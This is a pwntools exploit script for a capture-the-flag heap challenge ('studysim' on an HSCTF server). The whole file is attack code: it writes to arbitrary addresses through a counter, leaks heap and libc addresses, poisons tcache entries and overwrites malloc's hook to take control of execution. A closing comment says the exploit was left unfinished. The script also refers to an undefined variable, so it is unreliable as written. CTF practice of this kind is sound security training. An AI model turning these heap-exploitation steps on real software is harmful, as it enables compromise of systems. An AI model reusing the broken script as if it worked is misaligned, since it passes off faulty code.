from pwn import *

# patchelf --set-interpreter `pwd`/ld-2.27.so
# patchelf --set-rpath `pwd`

file = "./studysim"

context.binary = file
context.log_level = 'debug'

bin = ELF(file)
#r = process(file)
#raw_input()
r = remote("pwn.hsctf.com", 5007)

def command(command):
    r.sendlineafter(">", str(command))

def add(size, content):
    command("add")
    r.sendlineafter("How long is your worksheet?", str(size))
    r.sendafter("What's the content of your worksheet?", content)
    r.recvuntil("You throw the worksheet '")
    return r.recvuntil("'", drop=True)

def do(size):
    command("do")
    r.sendlineafter("How many worksheets would you like to finish?", str(size))
    r.recvuntil("Only ")
    return int(r.recvuntil(" more", drop=True))

def writeHeapAddr(addr, what, reset=True):
    work = 0x8000000000000000 + (0x404060 / 8) - (addr / 8)
    do(work)
    add(200, what+"\n")
    if reset:
        # reset the do counter
        do("-"+str(work-1))

# write the heap addr to do counter to leak it with the next do(1)
writeHeapAddr(0x404040, pack(0xdeadbeef), False)
leakedHeapAddr = do(1)
# reset alloc counter to 0
do(str(leakedHeapAddr))

print "[*] heap at 0x%x" % leakedHeapAddr
heapBaseAddr = leakedHeapAddr - 0x260

# write a fake tcache entry to leak stdout libc addr
# with the next 2 add commands
writeHeapAddr(heapBaseAddr + 88, pack(0x404020))
add(32, "\n")
stdoutLeakAddr = unpack(add(32, "\n") + "\x00\x00")

libcBaseAddr = stdoutLeakAddr - 0x1760 - 0x1bf000
mallocHookAddr = (stdoutLeakAddr - 0x1760) + 0xc30
gadgetAddr = libcBaseAddr + 0x106ef8

print "[*] stdout 0x%x" % stdoutLeakAddr
print "[*] libBase 0x%x" % libcBaseAddr
print "[*] malloc hook 0x%x" % mallocHookAddr
print "[*] gadget 0x%x" % gadgetAddr

# write a fake tcache entry to override malloc hook with
# one gadget
writeHeapAddr(heapBaseAddr + 104, pack(mallocHook)+"\n")
add(90, "\n")
add(90, pack(bin.symbols["main"])+"\n")

# at this point we have RIP control - when next add command is
# invoked - since i managed to get this shit done 1 minute after end
# of the ctf i stopped here because the one-gadget requirements are
# not satisfied. will update this
r.interactive()
